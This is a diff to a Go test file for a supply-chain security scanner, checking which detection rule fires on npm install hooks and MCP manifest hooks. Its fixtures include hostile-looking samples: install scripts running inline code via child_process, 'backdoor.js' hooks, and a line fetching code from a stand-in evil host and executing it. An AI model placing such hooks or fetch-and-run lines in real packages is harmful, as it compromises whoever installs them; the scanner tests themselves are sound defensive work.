@@ -58,6 +58,174 @@ func TestScanContent(t *testing.T) {
 	}
 }
 
+// TestSupply026OwnsNpmLifecycle locks the MCP_008 -> SUPPLY_026 ownership
+// split: an npm package.json install-time hook that runs local JS must
+// surface as SUPPLY_026 (supply-chain), NOT MCP_008 (mcp-attack), while a
+// real MCP server manifest hook (init_script) still surfaces as MCP_008.
+// This guards the v0.22.x narrowing where preinstall/postinstall were
+// dropped from MCP_008 so an ordinary npm package stops drawing an
+// mcp-attack finding (and stops double-emitting).
+func TestSupply026OwnsNpmLifecycle(t *testing.T) {
+	cases := []struct {
+		name, filename, content string
+		want                    []string // all must be present
+		anyOf                   []string // at least one must be present
+		atMostOneOf             []string // no visible duplicate: at most one present
+		absent                  []string // none may be present
+	}{
+		{
+			name:     "preinstall node file -> SUPPLY_026 only",
+			filename: "package.json",
+			content:  `{"name":"x","version":"1.0.0","scripts":{"preinstall":"node index.js"}}`,
+			want:     []string{"SUPPLY_026"},
+			absent:   []string{"MCP_008"},
+		},
+		{
+			// SUPPLY_001 already owns preinstall + node -e; SUPPLY_026 also
+			// matches. Both are supply-chain HIGH on the same line, so dedup
+			// collapses them to a single finding (SUPPLY_001 wins). The
+			// user-visible contract: a supply-chain hit, no MCP_008, no
+			// duplicate.
+			name:        "preinstall node inline eval -> one supply-chain hit, deduped",
+			filename:    "package.json",
+			content:     `{"name":"x","version":"1.0.0","scripts":{"preinstall":"node -e \"require('child_process').exec('id')\""}}`,
+			anyOf:       []string{"SUPPLY_001", "SUPPLY_026"},
+			atMostOneOf: []string{"SUPPLY_001", "SUPPLY_026"},
+			absent:      []string{"MCP_008"},
+		},
+		{
+			// `prepare` is outside SUPPLY_001's preinstall/postinstall scope,
+			// so SUPPLY_026 owns inline node -e here with no dedup contest.
+			name:     "prepare node inline eval -> SUPPLY_026 specifically",
+			filename: "package.json",
+			content:  `{"name":"x","version":"1.0.0","scripts":{"prepare":"node --eval \"x\""}}`,
+			want:     []string{"SUPPLY_026"},
+			absent:   []string{"MCP_008", "SUPPLY_001"},
+		},
+		{
+			name:     "postinstall node mjs -> SUPPLY_026 only",
+			filename: "package.json",
+			content:  `{"name":"x","version":"1.0.0","scripts":{"postinstall":"node ./setup.mjs"}}`,
+			want:     []string{"SUPPLY_026"},
+			absent:   []string{"MCP_008"},
+		},
+		{
+			name:     "prepare bun run -> SUPPLY_026 only",
+			filename: "package.json",
+			content:  `{"name":"x","version":"1.0.0","scripts":{"prepare":"bun run index.js"}}`,
+			want:     []string{"SUPPLY_026"},
+			absent:   []string{"MCP_008"},
+		},
+		{
+			name:     "build node file -> neither (not a lifecycle hook)",
+			filename: "package.json",
+			content:  `{"name":"x","version":"1.0.0","scripts":{"build":"node index.js"}}`,
+			absent:   []string{"SUPPLY_026", "MCP_008"},
+		},
+		{
+			// Lifecycle-named key OUTSIDE the scripts object is not an npm
+			// auto-run hook; SUPPLY_026 is anchored to "scripts" so it does
+			// not fire here.
+			name:     "install key outside scripts object -> neither",
+			filename: "package.json",
+			content:  `{"config":{"install":"node index.js"},"prepare":"node x.js"}`,
+			absent:   []string{"SUPPLY_026", "MCP_008"},
+		},
+		{
+			name:     "postinstall husky -> neither",
+			filename: "package.json",
+			content:  `{"name":"x","version":"1.0.0","scripts":{"postinstall":"husky install"}}`,
+			absent:   []string{"SUPPLY_026", "MCP_008"},
+		},
+		{
+			name:     "preinstall only-allow -> neither",
+			filename: "package.json",
+			content:  `{"name":"x","version":"1.0.0","scripts":{"preinstall":"npx only-allow pnpm"}}`,
+			absent:   []string{"SUPPLY_026", "MCP_008"},
+		},
+		{
+			name:     "MCP manifest init_script node -> still MCP_008, not SUPPLY_026",
+			filename: "mcp-server.json",
+			content:  `{"init_script":"node server.js","on_start":"echo ok"}`,
+			want:     []string{"MCP_008"},
+			absent:   []string{"SUPPLY_026"},
+		},
+		{
+			// Non-package.json manifest with an npm-style lifecycle hook:
+			// MCP_008 still owns this (manifest tampering) because the
+			// !package.json exclusion only carves out package.json itself.
+			// SUPPLY_026 does not apply (it targets package.json only).
+			name:     "non-package.json manifest postinstall node -> MCP_008, not SUPPLY_026",
+			filename: "tool-manifest.json",
+			content:  `{"name":"srv","postinstall":"node backdoor.js"}`,
+			want:     []string{"MCP_008"},
+			absent:   []string{"SUPPLY_026"},
+		},
+		{
+			// The same hook in package.json flips ownership: SUPPLY_026, and
+			// MCP_008 is excluded by !package.json.
+			name:     "package.json postinstall node -> SUPPLY_026, MCP_008 excluded",
+			filename: "package.json",
+			content:  `{"name":"x","version":"1.0.0","scripts":{"postinstall":"node backdoor.js"}}`,
+			want:     []string{"SUPPLY_026"},
+			absent:   []string{"MCP_008"},
+		},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			result, err := aguara.ScanContent(context.Background(), c.content, c.filename)
+			if err != nil {
+				t.Fatalf("ScanContent failed: %v", err)
+			}
+			got := map[string]bool{}
+			for _, f := range result.Findings {
+				got[f.RuleID] = true
+			}
+			for _, id := range c.want {
+				if !got[id] {
+					t.Errorf("expected %s, got findings %v", id, keysOf(got))
+				}
+			}
+			if len(c.anyOf) > 0 {
+				hit := false
+				for _, id := range c.anyOf {
+					if got[id] {
+						hit = true
+						break
+					}
+				}
+				if !hit {
+					t.Errorf("expected at least one of %v, got findings %v", c.anyOf, keysOf(got))
+				}
+			}
+			if len(c.atMostOneOf) > 0 {
+				n := 0
+				for _, id := range c.atMostOneOf {
+					if got[id] {
+						n++
+					}
+				}
+				if n > 1 {
+					t.Errorf("expected at most one of %v (no visible duplicate), got findings %v", c.atMostOneOf, keysOf(got))
+				}
+			}
+			for _, id := range c.absent {
+				if got[id] {
+					t.Errorf("did not expect %s, got findings %v", id, keysOf(got))
+				}
+			}
+		})
+	}
+}
+
+func keysOf(m map[string]bool) []string {
+	out := make([]string, 0, len(m))
+	for k := range m {
+		out = append(out, k)
+	}
+	return out
+}
+
 // TestScanContentAnalyzerRulesReachPublicAPI locks the pyrisk and rsbuild
 // analyzers into the library scanner. Their detections used to live as
 // co-presence YAML rules; once those were retired, the only thing keeping
@@ -75,6 +243,12 @@ func TestScanContentAnalyzerRulesReachPublicAPI(t *testing.T) {
 payload = requests.get("https://evil.example/p.js").text
 subprocess.run(["node", "-e", payload])
 `,
+		},
+		{
+			name:     "pkgmeta npm lifecycle local JS through public API",
+			filename: "package.json",
+			ruleID:   "SUPPLY_026",
+			content:  `{"name":"x","version":"1.0.0","scripts":{"preinstall":"node index.js"}}`,
 		},
 		{
 			name:     "rsbuild wallet read -> network through public API",
@@ -187,12 +361,12 @@ func TestListRulesIncludesAnalyzerRules(t *testing.T) {
 		ids[r.ID] = r.Analyzer
 	}
 	want := map[string]string{
-		"JS_DNS_TXT_EXFIL_001":  "jsrisk",
-		"GHA_PWN_REQUEST_001":   "ci-trust",
-		"NPM_LIFECYCLE_GIT_001": "pkgmeta",
-		"TOXIC_001":             "toxicflow",
+		"JS_DNS_TXT_EXFIL_001":   "jsrisk",
+		"GHA_PWN_REQUEST_001":    "ci-trust",
+		"NPM_LIFECYCLE_GIT_001":  "pkgmeta",
+		"TOXIC_001":              "toxicflow",
 		"NLP_HIDDEN_INSTRUCTION": "nlp",
-		"RUGPULL_001":           "rugpull",
+		"RUGPULL_001":            "rugpull",
 	}
 	for id, analyzer := range want {
 		got, ok := ids[id]
